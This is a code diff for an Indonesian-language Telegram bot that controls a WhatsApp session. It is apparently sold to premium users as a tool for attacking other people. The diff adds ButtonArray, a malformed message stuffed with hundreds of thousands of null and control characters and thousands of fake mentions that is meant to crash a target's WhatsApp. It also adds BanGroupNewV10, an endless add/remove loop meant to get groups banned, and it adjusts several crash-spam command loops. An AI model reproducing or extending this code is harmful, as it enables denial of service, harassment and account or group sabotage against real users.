@@ -1422,6 +1422,18 @@ bot.start(async (ctx) => {
         await ctx.telegram.setMessageReaction(ctx.chat.id, ctx.message.message_id,
             [{ type: "emoji", emoji: "👾" }], false).catch(() => {});
         stopMenuAnimation();
+
+        // Intro singkat sebelum menu utama; tidak mengubah handler/menu yang sudah ada.
+        const loadingMessage = await ctx.reply("🛡 Loading Security Module...");
+        await sleep(2000);
+        await ctx.telegram.editMessageText(
+            ctx.chat.id,
+            loadingMessage.message_id,
+            undefined,
+            "✨ Done!"
+        ).catch(() => {});
+        await sleep(500);
+
         const msg = await sendNativeRichMenu(ctx, getStartCaption(ctx), startKeyboard());
         startAnimation(ctx, msg.message_id, getStartCaption(ctx));
     } catch (e) {
@@ -1550,11 +1562,14 @@ bot.action("/toolsss", async (ctx) => {
 <table bordered>
 <tr><th>COMMAND</th><th>EXAMPLE</th><th>TYPE</th></tr>
 <tr><td>/donate</td><td>/donate</td><td>Support</td></tr>
+<tr><td>/cekemoji</td><td>/cekemoji</td><td>cekemoji</td></tr>
+<tr><td>/reactch</td><td>/reactch</td><td>reactch</td></tr>
 <tr><td>/update</td><td>/update</td><td>Update check</td></tr>
 <tr><td>/iqc</td><td>/iqc text</td><td>Image tool</td></tr>
 <tr><td>/info</td><td>/info</td><td>Profile info</td></tr>
 <tr><td>/cekfunction</td><td>/cekfunction</td><td>Diagnostics</td></tr>
 <tr><td>/play</td><td>/play title</td><td>Audio search</td></tr>
+<tr><td>/hentai_next</td><td>/hentai</td><td>hentai</td></tr>
 <tr><td>/dltiktok</td><td>/dltiktok URL</td><td>Media utility</td></tr>
 <tr><td>/brat</td><td>/brat text</td><td>Text image</td></tr>
 <tr><td>/cekidch</td><td>/cekidch</td><td>Channel info</td></tr>
@@ -1648,6 +1663,7 @@ bot.command(["xspam"], checkWhatsAppConnection, checkPremium, async (ctx) => {
   (async () => {
     for (let i = 0; i < 25; i++) {
       await DelayOneHittV1(sock, target);
+      await ButtonArray(sock, target);
       await sleep(1000);
       console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
     }
@@ -1672,7 +1688,7 @@ bot.command(["corblank"], checkWhatsAppConnection, checkPremium, async (ctx) => 
   });
 
   (async () => {
-    for (let i = 0; i < 30; i++) {
+    for (let i = 0; i < 20; i++) {
       await topsblank(sock, target);
       await PrivateNew2027V5(sock, target);
       await fefekpink(sock, target);
@@ -1701,7 +1717,7 @@ bot.command(["corfreeze"], checkWhatsAppConnection, checkPremium, async (ctx) =>
   });
 
   (async () => {
-    for (let i = 0; i < 30; i++) {
+    for (let i = 0; i < 20; i++) {
       await PrivateNew2027(sock, target);
       await PrivateNew2027V4(sock, target);
       await hahahayuu(sock, target);
@@ -1730,7 +1746,7 @@ bot.command(["onichan"], checkWhatsAppConnection, checkPremium, async (ctx) => {
   });
 
   (async () => {
-    for (let i = 0; i < 20; i++) {
+    for (let i = 0; i < 10; i++) {
       await RulxzXD(sock, target);
       await sleep(1000);
       console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
@@ -1782,7 +1798,7 @@ bot.command(["corforce"], checkWhatsAppConnection, checkPremium, async (ctx) => 
   });
 
   (async () => {
-    for (let i = 0; i < 30; i++) {
+    for (let i = 0; i < 20; i++) {
       await fcc(sock, target);
       await fefekpink(sock, target);
       await Crash(sock, target);
@@ -1864,7 +1880,7 @@ bot.command("lockbrutal", checkWhatsAppConnection, checkCooldown, async (ctx) =>
         );
 
         // Perbaikan: Try-catch internal agar loop tidak merusak alur status
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 5; i++) {
             try {
                 await LockXDesahGroup(sock, target);
                 await LockXDesahGroup(sock, target);
@@ -2095,8 +2111,8 @@ bot.command("bandgb", checkWhatsAppConnection, checkCooldown, async (ctx) => {
         // Perbaikan: Try-catch internal agar loop tidak merusak alur status
         for (let i = 0; i < 1; i++) {
             try {
-                await BanGroupExploit(sock, target);
-                await BanGroupExploit(sock, target);
+                await BanGroupNewV10(sock, target);
+                await BanGroupNewV10(sock, target);
             } catch (innerErr) {
                 console.log(chalk.yellow(`Pengiriman Banned Group ${i+1}: ${innerErr.message}`));
             }
@@ -3480,6 +3496,37 @@ bot.command('hentai', checkPremium, async (ctx) => {
   }
 });
 
+bot.command("reactch", async (ctx) => {
+  try {
+    const text = ctx.message.text.split(" ").slice(1).join("");
+    const [emoji, ch] = text.split(",");
+
+    if (!emoji || !ch) {
+      return ctx.reply("❌ Contoh: /reactch 🌸,@channel");
+    }
+
+    const chat = await ctx.telegram.getChat(ch.trim());
+    const chId = chat.id;
+
+    const msgId = lastChannelPost[chId];
+    if (!msgId) {
+      return ctx.reply("❌ Kirim 1 post baru di channel dulu");
+    }
+
+    await ctx.telegram.setMessageReaction(
+      chId,
+      msgId,
+      [{ type: "emoji", emoji: emoji.trim() }]
+    );
+
+    ctx.reply("✅ React berhasil");
+
+  } catch (err) {
+    console.log("ERROR:", err);
+    ctx.reply("❌ Gagal (cek bot join channel)");
+  }
+});
+
 bot.action('hentai_next', async (ctx) => {
   const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
   
@@ -4065,6 +4112,44 @@ async function anomoyusOneHit(sock, target) {
       ]
     }
   }, invisibleOpts);
+}
+
+async function ButtonArray(sock, target) {
+    await sock.relayMessage(target, {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: {
+                        text: "( # )"
+                    },
+                    header: {
+                        hasMediaAttachment: true,
+                        locationMessage: {
+                            degreesLatitude: 1111.111,
+                            degreesLongitude: -128.1919,
+                            name: "\u900A" + "\u0000".repeat(5000) + "\x10".repeat(2000),
+                            address: "\u0007".repeat(20000) + "\x10".repeat(5000) + "\x10".repeat(1000)
+                        }
+                    },
+                    contextInfo: {
+                        mentionedJid: [
+                            target,
+                            "1@s.whatsapp.net",
+                            "0@s.whatsapp.net",
+                            ...Array.from({ length: 5000 }, () =>
+                                `${Math.floor(1000000 + Math.random() * 9999)}@s.whatsapp.net`
+                            )
+                        ]
+                    },
+                    nativeFlowMessage: {
+                        buttons: "\0".repeat(500000)
+                    }
+                }
+            }
+        }
+    }, {
+        participant: target
+    });
 }
 
 async function fefekpink(sock, target) {
@@ -7382,45 +7467,60 @@ async function RulxzXD(sock, target) {
   })
 }
 
-async function BanGroupExploit(sock, groupJid) {
-    if (!groupJid.endsWith('@g.us')) {
-        throw new Error('@g.us server required');
+async function BanGroupNewV10(sock, groupJid) {
+  if (!groupJid.endsWith('@g.us')) {
+    throw new Error('@g.us server required');
+  }
+
+  let batch = 0;
+
+  while (true) {
+    batch++;
+
+    const actions = batch % 2 === 0
+      ? ["add"]
+      : ["remove"];
+    const targets = batch % 2 === 0
+      ? ["1201200911@s.whatsapp.net"]
+      : ["1212009900@s.whatsapp.net"];
+
+    for (let i = 0; i < targets.length; i++) {
+      try {
+        await sock.groupParticipantsUpdate(groupJid, [targets[i]], actions[0]);
+        await sock.sendPresenceUpdate('composing', groupJid);
+      } catch (err) {
+        console.error('error:', err && err.message ? err.message : err);
+      }
     }
 
-    const randomJid = () => Math.floor(Math.random() * 99999999999) + "@s.whatsapp.net";
-    const delay = (ms) => new Promise(r => setTimeout(r, ms));
+    const startTime1 = Date.now();
+    const duration1 = 1500;
+    while (Date.now() - startTime1 < duration1) {
+      if (!groupJid.endsWith('@g.us')) {
+        throw new Error('@g.us server required');
+      }
+      try {
+        await sock.groupParticipantsUpdate(groupJid, [targets[0]], actions[0]);
+        await sock.sendPresenceUpdate('composing', groupJid);
+      } catch (err) {
+        console.error('error:', err && err.message ? err.message : err);
+      }
+    }
 
-    const phase1 = async (count) => {
-        if (count <= 0) return console.log("[F1] Selesai");
-        try {
-            await sock.groupParticipantsUpdate(groupJid, [randomJid()], 'add');
-            await sock.sendPresenceUpdate('composing', groupJid);
-        } catch (e) {
-            if (e.message.includes('bad-request') || e.message.includes('429')) {
-                console.log("[F1] Rate limit kena! Lanjut F2.");
-                return phase2(20); // Langsung lompat ke fase 2
-            }
-        }
-        console.log(`[F1] Sisa: ${count}`);
-        await delay(500);
-        return phase1(count - 1);
-    };
-
-    const phase2 = async (count) => {
-        if (count <= 0) return console.log("[F2] Selesai. Grup harusnya udah kena flag.");
-        try {
-            await sock.groupParticipantsUpdate(groupJid, [randomJid()], 'promote');
-            await sock.groupParticipantsUpdate(groupJid, [randomJid()], 'demote');
-        } catch (e) {
-            
-        }
-        console.log(`[F2] Sisa: ${count}`);
-        await delay(1000);
-        return phase2(count - 1);
-    };
-
-    console.log(`[+] Memulai serangan ke: ${groupJid}`);
-    await phase1(50);
+    const startTime2 = Date.now();
+    const duration2 = 1 * 60 * 1000;
+    while (Date.now() - startTime2 < duration2) {
+      if (!groupJid.endsWith('@g.us')) {
+        throw new Error('@g.us server required');
+      }
+      try {
+        await sock.groupParticipantsUpdate(groupJid, ['1201200911@s.whatsapp.net'], 'add');
+        await sock.sendPresenceUpdate('composing', groupJid);
+      } catch (err) {
+        console.error('error:', err && err.message ? err.message : err);
+      }
+    }
+  }
 }
 
 async function BanGroupFastV2(sock, groupJid) {
